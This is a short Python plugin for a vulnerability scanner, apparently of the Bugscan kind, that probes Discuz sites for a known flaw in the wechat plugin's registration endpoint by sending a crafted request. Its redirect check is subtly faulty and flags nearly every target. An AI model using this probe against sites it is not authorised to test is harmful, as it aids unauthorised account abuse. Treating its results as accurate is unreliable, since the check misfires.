#!/usr/bin/env python
# -*- coding: utf-8 -*-
# __Author__ = moonfish
# _PlugName_ = discuz_plugin_wechat
# __Refer___ = https://gitee.com/ComsenzDiscuz/DiscuzX/issues/IPRUI

def assign(service, arg):
    if service == fingerprint.discuz:
        return True, arg


def audit(arg):
    payload = '/plugin.php?id=wechat:wechat&ac=wxregister&username=abcdefg'
    target = arg + payload

    code, head, res, final_url, log = hackhttp.http(target)

    if final_url.find('wsq.discuz.qq.com'):
        security_note(target)


if __name__ == '__main__':
    from dummy import *
    audit(assign(fingerprint.discuz, 'https://www.***.com/')[1])
